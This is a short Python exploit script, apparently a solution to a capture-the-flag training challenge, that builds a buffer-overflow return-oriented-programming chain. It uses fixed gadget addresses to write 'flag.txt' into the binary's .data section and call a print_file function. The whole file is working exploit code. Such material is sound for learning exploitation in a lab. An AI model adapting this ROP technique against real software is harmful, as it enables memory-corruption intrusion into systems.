#!/usr/bin/env python

import struct
import sys

padding_len = 32 #until just before rbp is overwritten

rbp = struct.pack("L", 0x13371337c000ffee)

print_file = struct.pack("L", 0x400510)
mov_pr14_r15 = struct.pack("L", 0x400628)
pop_r14_r15 = struct.pack("L", 0x400690)
pop_rdi = struct.pack("L", 0x400693)

filename_loc = struct.pack("L", 0x601028) #.data
filename = b"flag.txt"

payload = b'A'*padding_len
payload += rbp
payload += pop_r14_r15
payload += filename_loc  
payload += filename 
payload += mov_pr14_r15
payload += pop_rdi
payload += filename_loc
payload += print_file 

sys.stdout.buffer.write(payload)
